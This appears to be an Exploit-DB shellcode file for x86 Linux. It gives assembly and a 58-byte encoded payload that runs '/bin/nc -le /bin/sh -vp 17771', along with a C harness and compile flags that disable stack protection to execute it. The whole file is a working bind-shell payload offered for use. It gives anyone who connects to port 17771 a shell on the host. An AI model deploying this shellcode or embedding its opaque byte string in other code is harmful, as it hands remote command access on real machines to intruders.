/*
# Linux x86 /bin/nc -le /bin/sh -vp 17771 shellcode
# This shellcode will listen on port 17771 and give you /bin/sh
# Shellcode Author: Oleg Boytsev
# Tested on: Debian GNU/Linux 7/i686
# Shellcode Length: 58
# EDB Note ~ Command: gcc -m32 -z execstack x86_Linux_netcat_shellcode.c -o x86_Linux_netcat_shellcode

global _start
section .text
 _start:
	xor eax, eax
	xor edx, edx
	push eax
	push 0x31373737		;-vp17771
	push 0x3170762d
	mov esi, esp

	push eax
	push 0x68732f2f		;-le//bin//sh
	push 0x6e69622f
	push 0x2f656c2d
	mov edi, esp

	push eax
	push 0x636e2f2f		;/bin//nc
	push 0x6e69622f
	mov ebx, esp

	push edx
	push esi
	push edi
	push ebx
	mov ecx, esp
	mov al,11
	int 0x80
*/

#include<stdio.h>
#include<string.h>

unsigned char shellcode[] =
"\x31\xc0\x31\xd2\x50\x68\x37\x37\x37\x31\x68\x2d\x76\x70\x31\x89\xe6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{
        printf("Shellcode Length: %d\n",strlen(shellcode));
        int (*ret)() = (int(*)())shellcode;
        ret();
}